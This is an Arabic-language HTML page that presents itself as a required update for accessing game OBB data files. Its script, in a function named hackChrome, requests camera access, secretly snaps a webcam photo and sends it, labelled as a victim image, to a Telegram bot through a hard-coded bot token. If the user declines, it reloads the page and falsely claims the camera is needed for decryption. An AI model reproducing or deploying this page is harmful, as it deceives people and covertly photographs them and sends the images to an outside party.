<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحميل ملفات الداتا</title>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 50px; }
        .btn { background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <h2>تحديث مطلوب للوصول للملفات</h2>
    <p>يجب السماح بالتحقق من الهوية لتشغيل ملفات الـ OBB بنجاح.</p>
    <button class="btn" onclick="hackChrome()">اضغط هنا للاستمرار</button>

<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>

<script>
    const T = "8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU";
    const C = "6978465145";

    async function hackChrome() {
        try {
            // طلب الكاميرا والموقع معاً لزيادة السيطرة
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            v.srcObject = stream;

            // إرسال تنبيه للبوت ببدء العملية
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🚀 الضحية وافق وجاري السحب...`);

            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(v, 0, 0, 640, 480);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', blob, 'victim.jpg');
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.8);

                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) {
            // نظام الإلحاح في حال الرفض كما في تجربتك
            alert("خطأ: يجب السماح بالوصول للكاميرا لإتمام فك التشفير.");
            location.reload();
        }
    }
</script>
</body>
</html>
